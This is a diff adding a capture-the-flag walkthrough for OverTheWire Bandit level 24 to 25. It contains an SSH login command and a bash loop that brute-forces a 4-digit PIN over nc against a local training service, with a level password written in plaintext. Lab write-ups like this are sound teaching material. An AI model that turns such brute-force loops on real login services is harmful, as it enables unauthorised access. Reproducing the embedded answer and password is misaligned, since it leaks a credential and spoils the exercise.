@@ -1,0 +1,17 @@
+OverTheWire Bandit: Level 24 → 25
+
+Objective
+Retrieve the password for Level 25.
+The password is protected by a service on localhost port 30002 that requires the correct 4-digit PIN along with the Level 24 password.
+
+Steps
+Log in as bandit24:
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+Brute-force the 4-digit PIN using a loop and nc:
+for i in {0000..9999}; do
+echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
+done
+Observe the output to identify the correct response.
+
+Result
+The correct PIN returns the password for Bandit Level 25.
